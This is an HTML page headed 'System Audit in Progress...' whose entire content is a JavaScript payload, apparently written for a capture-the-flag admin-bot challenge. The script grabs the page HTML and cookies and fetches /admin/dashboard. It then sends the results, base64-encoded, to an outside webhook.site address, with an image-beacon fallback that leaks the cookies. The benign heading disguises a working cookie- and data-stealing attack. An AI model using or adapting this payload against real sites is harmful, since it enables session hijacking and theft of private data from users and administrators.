<!DOCTYPE html>
<html>
<body>
    <h1>System Audit in Progress...</h1>
    <script>
        const webhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';

        // 1. Grab everything from the current page the bot is on
        const pageContent = document.documentElement.innerHTML;
        const flagInHtml = pageContent.match(/Hash{[^}]+}/i);
        
        // 2. Grab the Cookies (Flags are often here)
        const cookies = document.cookie;
        const flagInCookies = cookies.match(/Hash{[^}]+}/i);

        // 3. Try to fetch the Dashboard text directly (most common flag location)
        fetch('/admin/dashboard')
            .then(r => r.text())
            .then(text => {
                const flagInDash = text.match(/Hash{[^}]+}/i);
                
                // Send all results back in one go
                const report = {
                    html: flagInHtml ? flagInHtml[0] : "Not found in HTML",
                    cookie: flagInCookies ? flagInCookies[0] : "Not found in Cookies",
                    dashboard: flagInDash ? flagInDash[0] : "Not found in Dashboard",
                    location: window.location.href
                };

                fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: btoa(JSON.stringify(report))
                });
            })
            .catch(err => {
                // If dashboard is blocked, at least send what we have
                new Image().src = webhook + '?quick_leak=' + btoa(cookies + " | " + (flagInHtml || "None"));
            });
    </script>
</body>
</html>
